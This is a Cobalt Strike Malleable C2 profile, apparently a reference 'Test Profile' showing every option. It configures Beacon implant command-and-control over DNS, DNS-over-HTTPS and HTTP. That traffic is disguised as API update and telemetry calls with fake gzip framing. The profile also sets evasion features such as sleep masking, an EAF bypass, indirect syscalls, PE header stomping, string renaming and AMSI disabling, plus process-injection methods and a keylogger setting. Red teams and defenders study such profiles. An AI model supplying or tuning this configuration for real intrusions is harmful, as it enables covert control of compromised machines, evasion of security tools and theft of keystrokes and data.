# This profile is meant to show all of the options available in Malleable C2

# Various options

set sample_name "Test Profile";
set data_jitter "0"; # Append random-length string (up to data_jitter value) to http-get and http-post server output
set host_stage "true"; # Host payload for staging over set, setS, or DNS. Required by stagers.
set tasks_max_size "2097152"; # The maximum size (in bytes) of task(s) and proxy data that can be transferred through a communication channel at a check in
set pipename "msagent_###"; # Default name of pipe to use for SMB Beacon’s peer-to-peer communication. Each # is replaced witha random hex value.
set pipename_stager "status_##";
set smb_frame_header "";
set ssh_banner "Cobalt Strike 4.2";

set sleeptime "60000"; # default sleep in ms
set jitter "0"; # Sleep jitter (0-99%)

# Alternate ways to specify 'sleeptime' with sleep 'jitter'
# set sleep "20 25"; # 20 seconds sleep with 25% jitter
# set sleep "1d 13h 34m 45s 25j";

set ssh_pipename "postex_ssh_####";
set tcp_frame_header "";
set tcp_port "4444";

set headers_remove "header-1,header-2,header-3";  # list of HTTP client headers to remove

# Numeric value of a binary mask (11 = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8))
set steal_token_access_mask "11";

# The maximum size (in bytes) of proxy data to transfer via the communication channel at a check in.
set tasks_proxy_max_size "921600";

# The maximum size (in bytes) of proxy data to transfer via the DNS communication channel at a check in.
set tasks_dns_proxy_max_size "71680";

# See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm
dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".stage.123456.";
    set dns_ttl "1";

    set beacon         "doc.bc.";
    set get_A          "doc.1a.";
    set get_AAAA       "doc.4a.";
    set get_TXT        "doc.tx.";
    set put_metadata   "doc.md.";
    set put_output     "doc.po.";

    # Use "ns_response" when a DNS server is responding to a target with "Server failure" errors.
    set ns_response "zero";

    # Use these options to egress DNS Beacons with "DNS Over HTTPS"
    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)";
        set doh_proxy_server   "";
        set doh_server         "cloudflare-dns.com";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
        header "header-1"      "h1-value";
    }

}

# Defaults for ALL CS set server responses

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive""timeout=5, max=100";
    header "Connection""Keep-Alive";

    # The set trust_x_forwarded_foroption decides if Cobalt Strike uses the
    # X-Forwarded-For set header to determine the remote address of a request.
    # Use this option if your Cobalt Strike server is behind an set redirector
    set trust_x_forwarded_for "true";

    # Cobalt Strike’s web server blocks requests from the Lynx, Wget, or Curl browser.
    # This can be reconfigured with these options.
    set block_useragents "curl*,lynx*,wget*";
    set allow_useragents "";
}

https-certificate {
    set C "US"; #Country
    set CN "localhost"; # CN - you will probably nver use this, but don't leave at localost
    set L "San Francisco"; #Locality
    set OU "IT Services"; #Org unit
    set O "FooCorp"; #Org name
    set ST "CA"; #State
    set validity "365";

    # if using a valid vert, specify this, keystore = java keystore
    #set keystore "domain.store";
    #set password "mypassword";

}

#If you have code signing cert:
#code-signer {
#    set keystore "keystore.jks";
#    set password "password";
#    set alias    "server";
#    set timestamp "false";
#    set timestamp_url "set://timestamp.digicert.com";
#    set digest_algorithm "SHA256";
#}

# Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
http-stager {
    set uri_x86 "/api/v1/GetLicence";     
    set uri_x64 "/api/v2/GetLicence";

    client {
        parameter "uuid" "96c5f1e1-067b-492e-a38b-4f6290369121";
        #header "headername" "headervalue";
    }

    server {
        header "Content-Type" "application/octet-stream";    
        header "Content-Encoding" "gzip";    
        output {        
            #GZIP headers and footers
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
            #AFAICT print is the only supported terminator
            print;
        }
    }
}

# This is used only in http-get and http-post and not during stage
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

# define indicators for an set GET
http-get {
    # we require a stub URI to attach the rest of our data to.
    set uri "/api/v1/Updates";

    client {

        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
        # mask our metadata, base64 encode it, store it in the URI
        metadata {


            # XOR encode the value
            mask;
            
            # URL-safe Base64 Encode
            #base64url;

            # URL-safe Base64 Encode
            base64;

            # NetBIOS Encode ‘a’ ?
            #netbios;

            #NetBIOS Encode ‘A’
            #netbiosu;

            # You probably want these to be last two, else you will encode these values

            # Append a string to metadata
            append ";" ;

            # Prepend a string
            prepend "SESSION=";
            # Terminator statements - these say where the metadata goes
            # Pick one

            # Append to URI
            # uri-append;


            
            #Set in a header
            header "Cookie";

            #Send data as transaction body
            #print

            #Store data in a URI parameter
            #parameter "someparam"

        }
    }

    server {
        header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";
        # prepend some text in case the GET is empty.
        output {
            mask;
            base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";          
            print;
        }
    }
}

# define indicators for an set POST
http-post {
    set uri "/api/v1/Telemetry/Id/";
    set verb "POST";

    # This controls the amount of file download data that a beacon can process
    # during one cycle (check-in) when using HTTP Posts with the GET verb.
    #   Default: 4096
    #   Values: Blank or Zero | 4096 - 65536 (bytes)
    set client_max_post_get_packet "4096";

    # This controls the size of chunked data (data sent per request)
    # when beacon is posting with a GET verb into an HTTP Header.
    #   Default: 96
    #   Values: Blank or Zero | 96 - 4096 (bytes)
    # set client_max_post_get_size "96";

    # Setting this will cause HTTP posted data (with the POST verb) to
    # be chunked into multiple smaller requests.
    #   Default: 524288
    #   Values: Blank or Zero | 1024 - 524288 (bytes)
    # set client_max_post_post_size "524288";

    client {
        # make it look like we're posting something cool.
        header "Content-Type" "application/json";
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";

        # ugh, our data has to go somewhere!
        output {
            mask;
            base64url;
            uri-append;
        }

        # randomize and post our session ID
        id {
            mask;
            base64url;
            prepend "{version: 1, d=\x22";            
            append "\x22}\n";
            print;
        }
    }

    # The server's response to our set POST
    server {
        header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";

        # post usually sends nothing, so let's prepend a string, mask it, and
        # base64 encode it. We'll get something different back each time.
        output {
            mask;
            base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";          
            print;
        }
    }
}

# HTTP Host Profiles
# See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-host-profiles.htm
http-host-profiles {
    profile {
        set             host-name                   "one.ytrewq.com";
        http-get {
            set         uri                         "/[a|b|c|d]/ytrewq/get.js";
            header      "ytrewq-header-[a|b|c]"     "static-value";
            parameter   "ytrewq-parameter"          "value-[x|y|z]";
            parameter   "ytrewq-[a|b|c]"            "value-[x|y|z]";
            ## Example of param name that will be dropped when it resolves as blank
            parameter   "[p1|||p4]"                 "[a|b|c]";
        }
        http-post {
            set         uri   "/[a|b|c|d]/ytrewq/[post1|post2|post3|post4].js";
            header      "ytrewq-header-[a|b|c]"     "static-value";
            parameter   "ytrewq-parameter"          "value-[x|y|z]";
            parameter   "ytrewq-[a|b|c]"            "value-[x|y|z]";
            parameter   "[p1|||p4]"                 "[a|b|c]";
        }
    }
    profile {
        set             host-name        "two.ytrewq.com";
        http-get {
            set         uri              "/ytrewq/get/[2|two|dos]/[a|b|c].js";
        }
        http-post {
            set         uri              "/ytrewq/post/[2|two|dos]/[a|b|c].js";
        }
    }
}

http-beacon {
    # Use wininet or winhttp library? (default: wininet)
    set library "winhttp";

    # send random data in all beacon check-in/callbacks (and how much?)
    set data_required "true";
    set data_required_length "256-512";   # Random from 256 to 512
}

stage {

    set checksum "0";          # The CheckSum value in Beacon’s PE header
    set data_store_size "16";  # how many entries can be stored in Beacon Data Store

    set copy_pe_header         "true";          # copy Beacon to new memory location with its DLL headers
    set eaf_bypass             "true";          # enable PrependLoader to use Export Address Table Filtering bypass
    set rdll_loader            "PrependLoader"; # PrependLoader | StompLoader
    set rdll_use_syscalls      "true";          # Prepend loader should use indirect system calls when loading the Beacon payload.

    # This performs additional transformations to the Beacon’s DLL payload
    # Requires the stage.rdll_loader is set to PrependLoader
    transform-obfuscate {
        lznt1;      # LZNT1 compression
        rc4 "128";  # RC4 encryption - Key length parameter: 8-2048
        xor "64";   # xor encryption - Key length parameter: 8-2048
        base64;     # encodes using base64 encoding
    }

    # The transform-x86 and transform-x64 blocks pad and transform Beacon’s
    # Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 {
        prepend "\x90\x90";
        strrep "ReflectiveLoader" "DoLegitStuff";
    }
    
    transform-x64 {
        # transform the x64 rDLL stage, same options as with 
    }

    stringw "I am not Beacon";

    set allocator "MapViewOfFile";  # HeapAlloc, MapViewOfFile, or VirtualAlloc.

    set cleanup "true";        # Ask Beacon to attempt to free memory associated with
                                # the Reflective DLL package that initialized it.
    
    # Override the first bytes (MZ header included) of Beacon's Reflective DLL. 
    # Valid x86 instructions are required. Follow instructions that change
    # CPU state with instructions that undo the change.
    
    # set magic_mz_x86 "MZRE";
    # set magic_mz_x86 "MZAR";

    set magic_pe "PE";  #Override PE marker with something else

    # Ask the x86 ReflectiveLoader to load the specified library and overwrite
    #  its space instead of allocating memory with VirtualAlloc.
    # Only works with VirtualAlloc
    #set module_x86 "xpsservices.dll";
    #set module_x64 "xpsservices.dll";

    # Obfuscate the Reflective DLL’s import table, overwrite unused header content, 
    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
    set obfuscate "false"; 

    # Obfuscate Beacon, in-memory, prior to sleeping
    set sleep_mask "true";

    # Supports: None, Direct, and Indirect. Superseded by beacon_gate
    set syscall_method "None";

    # See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-gate.htm
    # beacon_gate may be set to:
    # ALL (Comms + Core + Cleanup)
    # COMMS (InternetOpenA and InternetConnectA)
    # CORE (Windows API equivalents (i.e., VirtualAlloc) of Beacon’s existing system call API)
    # CLEANUP proxying ExitThread via the Sleepmask
    # or specific supported APIs as shown below
    # beacon_gate ignored when sleep_mask is set to false
    beacon_gate {
      VirtualAlloc;
      VirtualAllocEx;
      InternetConnectA;
    }

    # Use embedded function pointer hints to bootstrap Beacon agent without 
    # walking kernel32 EAT
    set smartinject "false"; # Requires .stage.rdll_loader = StompLoader

    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after 
    # it loads Beacon payload
    set stomppe "true";


    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
    set userwx "false";

    # PE header cloning - see "petool", skipped for now
    set compile_time "14 Sep 2018 08:14:00";
    # set image_size_x86 "512000";
    # set image_size_x64 "512000";
    set entry_point "92145";

    #The Exported name of the Beacon DLL
    #set name "beacon.x64.dll" 
    
    # set rich_header  # Using a valid rich header from a different executable is recommended
    
}

process-inject {

    # set how memory is allocated in a remote process
    # VirtualAllocEx or NtMapViewOfSection.
    # The NtMapViewOfSection option is for same-architecture injection only.
    # VirtualAllocEx is always used for cross-arch memory allocations.
    set allocator "VirtualAllocEx";

    # shape the memory characteristics and content
    set min_alloc "16384";
    set startrwx "true";
    set userwx "false";

    # set how memory is allocated in the current process for BOF content
    set bof_allocator "VirtualAlloc"; # VirtualAlloc | MapViewOfFile | HeapAlloc
    set bof_reuse_memory "true";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
        # transform x64 injected content
    }

    # determine how to execute the injected code
    execute {
        ObfSetThreadContext;
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        NtQueueApcThread-s;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    # control the temporary process we spawn to
    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # change our post-ex output named pipe names...
    set pipename "msrpc_####, win\\msrpc_##";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

    # The thread_hint option allows multi-threaded post-ex DLLs to spawn
    # threads with a spoofed start address. Specify the thread hint as 
    # “module!function+0x##” to specify the start address to spoof. 
    # The optional 0x## part is an offset added to the start address.
    # set thread_hint "....TODO:FIXME"

    # options are: GetAsyncKeyState (def) or SetWindowsHookEx
    set keylogger "GetAsyncKeyState";

    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
    set cleanup "true";

    transform-x64 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }

    transform-x86 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }

}
